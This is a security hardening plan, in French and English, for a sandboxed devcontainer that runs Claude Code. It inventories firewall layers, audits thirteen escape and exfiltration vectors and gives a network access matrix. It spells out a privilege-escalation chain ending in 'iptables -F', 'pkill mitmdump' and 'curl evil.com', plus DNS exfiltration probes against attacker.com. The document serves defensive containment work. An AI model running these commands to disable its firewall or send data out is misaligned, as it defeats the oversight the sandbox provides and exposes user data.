# Existing — technical inventory + threat surface

> Snapshot of the code state at the start of this plan. Updated when a
> session adds / removes / restructures major files.
> For chronological history, see [LOG.md](LOG.md).
> For decisions and philosophy, see [ROLLOUT.md](ROLLOUT.md).

## Threat model (3 critères)

`node` user est **sandboxé** quand :
1. Il ne peut PAS relancer la machine seul
2. Il ne peut PAS modifier le firewall sans rebuild
3. Il ne peut PAS accéder à une ressource externe / exfiltrer sans rebuild

Tout vecteur qui viole l'un des 3 = critique (sessions essentielles).
Tout vecteur hors critères = defense-in-depth optionnel.

## Devcontainer architecture (relevant subset)

### Bind mounts (`.devcontainer/docker-compose.yml`)

```yaml
volumes:
  - ..:/workspace:delegated                       # RW — workspace root
  - ./vscode-settings.json:...:bind               # bind — VS Code settings
  - bash-history:/commandhistory                  # named volume
  - claude-config:/home/node/.claude              # named volume
  - claude-creds:/home/node/.claude-creds         # named volume EXTERNAL
  - mitmproxy:/var/lib/mitmproxy                  # named volume per-project
```

> Session 1 ✅ — the `./firewall:/etc/devcontainer-firewall:ro` bind mount
> was removed. Firewall config now lives baked in the image via
> `Dockerfile` `COPY firewall/`. Workspace writes to
> `.devcontainer/firewall/*` no longer propagate to `/etc/...` at runtime.

### Sudoers (`.devcontainer/Dockerfile.base` ~ligne 265)

```
node ALL=(root) NOPASSWD: /usr/local/bin/init-firewall.sh,
                          /usr/local/bin/test-firewall.sh
```

Après session 1 : retrait de `init-firewall.sh` de la sudoers entry
(le script tourne en root via le lifecycle hook qui est root).

### Lifecycle scripts (`.devcontainer/devcontainer.json`)

| Hook | Script | When | UID |
|---|---|---|---|
| `initializeCommand` | `initialize.sh` (host-side) | Before container creation | host user |
| `onCreateCommand` | `on-create.sh` | Once at container creation | node |
| `postCreateCommand` | `post-create.sh` | Once after creation | node |
| `postStartCommand` | `post-start.sh` | **Every container start = every "reload"** | node |

Les scripts in-container tournent en `node`. Modification de ces
scripts ne permet pas d'élévation (donc OK per threat model).

### Firewall stack (Layer 1-6)

```
node app → 127.0.0.53 (dnsmasq) → 8.8.8.8 if host in allowlist → iptables ipset
                                  → NXDOMAIN otherwise
node app → HTTPS_PROXY=127.0.0.1:8080 → mitmproxy → 5 addons (L2-L6)
                                                  → upstream (mitmproxy UID only)
```

Mitmproxy loads 5 Python addons from `/etc/devcontainer-firewall/addons/` :
`policy_enforce.py`, `format_detect.py`, `passive_log.py`, `stream_sse.py`,
`capture_messages_debug.py`.

**Important** : mitmproxy ne couvre que HTTP/HTTPS. Pour des protocoles
non-HTTP (sidecars custom), il y a un bypass via
`CLAUDE_CODE_FIREWALL_ALLOWED` → migration en session 1 vers
`firewall/direct-tcp-allow.txt` (baked).

## Surface d'attaque actuelle (audit 2026-05-22)

Status legend: 🔴 critical+open · 🟢 critical+blocked · ⚪ optional/accepted

### Faille architecturale racine

🟢 **R0** — Bloqué par session 1 ✅. Le bind mount `:ro` à
`/etc/devcontainer-firewall/` a été retiré ; `COPY firewall/` récursif
embarque toute la config dans l'image. La même écriture via workspace
modifie l'host file mais le runtime ne le lit plus (la vue `/etc/...`
vient de l'image baked, pas du bind mount). Preuve attendue post-rebuild :
```
echo test > /workspace/.devcontainer/firewall/.poc      → OK (workspace RW)
grep -F test /etc/devcontainer-firewall/.poc            → no match (découplé)
```

### Vecteurs identifiés (13 = 11 audit + 2 découverts en review)

| # | Vecteur | Viole critère | Status | Session |
|---|---|---|---|---|
| 1 | `domains.local.txt` + `policy.local.d/` poison | (2) (3) | 🟢 | 1 ✅ |
| 2 | Injection Python dans `addons/*.py` (5 fichiers) | (2) (3) | 🟢 | 1 ✅ |
| 3 | `dnsmasq.conf` poison (`address=`/`ipset=`) | (2) (3) | 🟢 | 1 ✅ |
| 4 | `/tmp/.firewall-env` source-as-root (privesc → tout) | (2) (3) via root | 🟢 | 2 ✅ |
| 5 | Hooks Claude `Stop`/`SessionEnd` (`settings.json`) | aucun (node-level) | ⚪ | 3 (optional) |
| 6 | Scripts lifecycle bind-montés (`shell-init.sh` & co) | aucun (node-level) | ⚪ | accepted |
| 7 | `vscode-settings.json` tasks/env auto-run | aucun (node-level) | ⚪ | accepted |
| 8 | `policy.d/*.yaml` élargissement silencieux | (2) (3) | 🟢 | 1 ✅ |
| 9 | Wildcard `*.statsig.com`/`*.githubusercontent.com` DNS exfil | (3) partiellement | ⚪ | gap P3 (out of scope) |
| 10 | `firewall-blocks` runtime call (à confirmer) | (2) ? | ⚪ | session 6 investigate |
| 11 | Logs mitmproxy lisibles par node (groupe `adm`) | aucun (lecture locale ≠ exfil) | ⚪ | 5 (optional) |
| 12 | Toggle firewall-mode → off via `firewall/default-mode` (baked since session 1) | (2) (3) | 🟢 | 1 ✅ |
| 13 | `CLAUDE_CODE_FIREWALL_ALLOWED=evil:443` migrated to baked `firewall/direct-tcp-allow.txt` | (2) (3) direct TCP | 🟢 | 1 ✅ |

### Chaîne « kill-shot »

**Hot, 30 secondes (avant fix)** : #4 → écrit shell code dans
`/tmp/.firewall-env` → `sudo init-firewall.sh` → code root →
`iptables -F` + `pkill mitmdump` → `curl evil.com` direct.

→ Bloqué par session 2 ✅ (la ligne `source /tmp/.firewall-env` est
supprimée d'init-firewall.sh et test-firewall.sh ; le fichier n'est
plus écrit par post-start.sh ni on-create.sh ; debug toggle passé
via `--debug` CLI flag).

**Reload furtif (avant fix)** : #8 (élargir `policy.d/api.anthropic.com.yaml`)
+ #2 (un seul addon Python modifié pour POST silencieux via path-tunnel
sur l'API Anthropic légitime). Diff git = 2 fichiers dans des paths
plausibles.

→ Bloqué par session 1 (config firewall baked, modif workspace n'a
plus d'effet runtime).

**Sous-trous découverts en review** :
- #12 (mode off via flag file workspace) → Bloqué par session 1
  (mode lu depuis fichier baked).
- #13 (direct TCP ajout via `.env`) → Bloqué par session 1
  (CLAUDE_CODE_FIREWALL_ALLOWED → `firewall/direct-tcp-allow.txt` baked).

## Fichiers critiques touchés par le rollout

### Session 1 (`bake-firewall-config`)

- [.devcontainer/docker-compose.yml](.devcontainer/docker-compose.yml) — ligne 48 (bind mount à supprimer)
- [.devcontainer/Dockerfile](.devcontainer/Dockerfile) — COPYs project firewall (1 ligne, récursif)
- [.devcontainer/Dockerfile.base](.devcontainer/Dockerfile.base) — sudoers entry, baseline firewall infrastructure
- [.devcontainer/firewall/default-mode](.devcontainer/firewall/default-mode) — NOUVEAU (contient `strict`)
- [.devcontainer/firewall/direct-tcp-allow.txt](.devcontainer/firewall/direct-tcp-allow.txt) — NOUVEAU (migré depuis `.env`)
- [.devcontainer/init-firewall.sh](.devcontainer/init-firewall.sh) — lit fichiers baked au lieu de env
- [.devcontainer/install.sh](.devcontainer/install.sh) — garantit les nouveaux fichiers existent + migration legacy

### Session 2 (`drop-env-injection`)

- [.devcontainer/init-firewall.sh](.devcontainer/init-firewall.sh) — ligne 7 (`source /tmp/.firewall-env`) à supprimer
- [.devcontainer/test-firewall.sh](.devcontainer/test-firewall.sh) — idem ligne 23
- [.devcontainer/post-start.sh](.devcontainer/post-start.sh) — supprimer écriture `/tmp/.firewall-env`
- [.devcontainer/on-create.sh](.devcontainer/on-create.sh) — idem

### Session 6 (validation)

- [plans/devcontainer-security-hardening/adversarial-report.md](plans/devcontainer-security-hardening/adversarial-report.md) — généré
- [.devcontainer/SECURITY-AUDIT-2026-05.md](.devcontainer/SECURITY-AUDIT-2026-05.md) — référence

## Volumes Docker et données sensibles

- **`claude-creds-<project>`** (`external: true`) : OAuth tokens
  Anthropic. Lisible par node depuis `/home/node/.claude-creds/`.
  Persistant entre reloads.
  → Hors scope critères (token est utilisable via firewall allowed
  → api.anthropic.com, pas une exfil de DATA).
- **`mitmproxy-<project>`** : contient `mitmproxy-ca-cert.pem` (CA root).
  Monté à `/var/lib/mitmproxy/`. `chmod 0600 mitmproxy:mitmproxy` —
  pas lisible par node.
- **`claude-config-<project>`** : `.claude.json`, `settings.json`,
  `plugins/`. Cible du vecteur #5 (hooks injection) — defense-in-depth.
- **`bash-history`** : `.zsh_history`. Lisible par node.

## Endpoints réseau

- `127.0.0.1:8080` — mitmproxy proxy (loopback ACCEPTed par iptables)
- `127.0.0.53` — dnsmasq (UDP/53 UID-owner restricted to dnsmasq user)
- `127.0.0.11` — Docker DNS embedded resolver
- Outbound : ipset `allowed-domains` + UID `mitmproxy` only (strict mode)
- **Direct TCP bypass** : hosts dans `firewall/direct-tcp-allow.txt`
  (post-session-1) reçoivent un `iptables -A OUTPUT -d $ip -p tcp
  --dport $port -j ACCEPT` direct, hors mitmproxy.

## Distinction mitmproxy vs direct TCP

| Type de trafic | Chemin | Allowlist | Port |
|---|---|---|---|
| HTTP/HTTPS (toutes versions) | `HTTPS_PROXY=127.0.0.1:8080` → mitmproxy | `domains.txt`, `policy.d/`, `domains.local.txt` | n'importe quel port HTTP |
| Sidecars / protocoles TCP custom (non-HTTP) | Direct → iptables ACCEPT | `firewall/direct-tcp-allow.txt` (baked) | host:port spécifique |

Mitmproxy gère n'importe quel port HTTP/HTTPS. Le `direct-tcp-allow.txt`
n'est nécessaire QUE pour les protocoles TCP non-HTTP qui ne peuvent
pas passer par un HTTP proxy.

## claude-switch — workflow nouveau

`claude-switch` (host-helper) toggle entre 3 modes Claude. Il modifie
**2 fichiers** (`.env` + `direct-tcp-allow.txt`). Comme `direct-tcp-allow.txt`
est baked, **chaque switch nécessite un rebuild**.

| Mode | `.env` `ANTHROPIC_BASE_URL` | `direct-tcp-allow.txt` |
|---|---|---|
| `cloud` (défaut) | absent | vide |
| `local-bridge` | `http://claude-bridge:9223` | `claude-bridge:9223` |
| `local-direct` | `http://host.docker.internal:11434` | `host:11434` |

**Par défaut, RIEN n'est ouvert** (cloud mode → `direct-tcp-allow.txt`
vide → 0 port direct TCP en plus de mitmproxy).

Switch entre modes = action consciente, rare (typiquement quelques
fois par projet). Le coût rebuild (~5-10s) est acceptable.

## Network access matrix — ce que node peut/ne peut pas faire

Le firewall fonctionne par **défaut DROP** + ACCEPT explicite. Réponses
détaillées aux questions fréquentes :

### Outbound TCP

| Action | Depuis node (UID 1000) | Résultat |
|---|---|---|
| `curl https://api.anthropic.com/...` (via HTTPS_PROXY) | passe par mitmproxy 127.0.0.1:8080 | ✅ ACCEPTED si host dans `domains.txt` |
| `curl --noproxy '*' https://api.anthropic.com:443` | direct TCP sortant | ❌ DROP (UID node ≠ mitmproxy, donc pas de match ipset) |
| `curl http://google.com:80` (port 80 direct) | DNS lookup → dnsmasq → NXDOMAIN | ❌ Bloqué L1 DNS |
| `curl http://1.2.3.4:80` (IP hardcodée, bypass DNS) | direct TCP sortant | ❌ DROP (IP pas dans ipset) |
| `curl http://claude-bridge:9223/...` (sidecar) | direct TCP (port dans direct-tcp-allow.txt) | ✅ ACCEPTED via iptables direct |
| `curl http://host.docker.internal:11434` (Ollama host) | direct TCP (entrée `host:11434`) | ✅ ACCEPTED si listée dans direct-tcp-allow.txt |
| `curl http://host.docker.internal:22` (SSH host) | port 22 PAS dans direct-tcp-allow.txt | ❌ DROP |

### Outbound UDP

| Action | Depuis node | Résultat |
|---|---|---|
| `dig api.anthropic.com` (vers `127.0.0.53`) | dnsmasq local, allowlisted | ✅ Résout |
| `dig evil.com` (vers `127.0.0.53`) | dnsmasq local, NON allowlisted | ❌ NXDOMAIN |
| `dig @8.8.8.8 evil.com` (DNS direct vers internet) | UDP/53 vers 8.8.8.8 | ❌ DROP (rule `-m owner --uid-owner dnsmasq`) |
| `nslookup -port=53 mydata.exfil.com @attacker.com` | idem | ❌ DROP |

→ DNS exfiltration "tunneling" via 8.8.8.8 est **impossible** depuis node.

### Outbound TCP/53 (DNS over TCP)

| Action | Résultat |
|---|---|
| TCP/53 vers n'importe quel IP | ❌ DROP (port 53 TCP pas dans les ACCEPT rules) |

→ DNS-over-TLS direct est aussi bloqué.

### Listen local / loopback

| Action | Résultat |
|---|---|
| `nc -l 9999` (listen sur port local) | ✅ OK (firewall ne filtre pas l'INPUT loopback) |
| `curl 127.0.0.1:8080` (mitmproxy local) | ✅ OK (`lo` ACCEPT) |
| `curl 127.0.0.1:9999` (nc lui-même) | ✅ OK (loopback) |
| Quelqu'un d'externe `curl <container-ip>:9999` | ❌ Bloqué (INPUT default DROP, pas de port forward) |

→ Listen local = OK mais pas exploitable pour exfil (rien de l'extérieur
ne peut atteindre le port).

### Outbound vers IP privées

| Cible | Résultat |
|---|---|
| `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` | ❌ REJECT explicite (init-firewall.sh) |
| `127.0.0.0/8` | ✅ ACCEPT (loopback) |
| `host.docker.internal` (gateway, IP variable) | ✅ Seulement si présent dans direct-tcp-allow.txt avec port précis |

### IPv6

| Action | Résultat |
|---|---|
| Toute requête IPv6 | ❌ DROP (sysctl disable + ip6tables policy DROP) |

→ Pas de bypass via IPv6.

### Synthèse — comment node peut sortir du container

**1 seule façon** : passer par mitmproxy (`HTTPS_PROXY=127.0.0.1:8080`)
qui à son tour applique :
- L1 DNS allowlist (`domains.txt` + `domains.local.txt`)
- L2 host check
- L3 method allowlist
- L4 body content inspection
- L5 URL inspection
- L6 size limits

**OU** : direct TCP vers un host:port listé dans
`firewall/direct-tcp-allow.txt` (baked, immutable au runtime).

Tout le reste = DROP. Pas de bypass via :
- Port hardcodé direct
- IP hardcodée direct
- DNS tunneling (UID-locked)
- DNS-over-TLS direct
- Loopback abuse
- IPv6
- Private IPs (REJECT explicit)
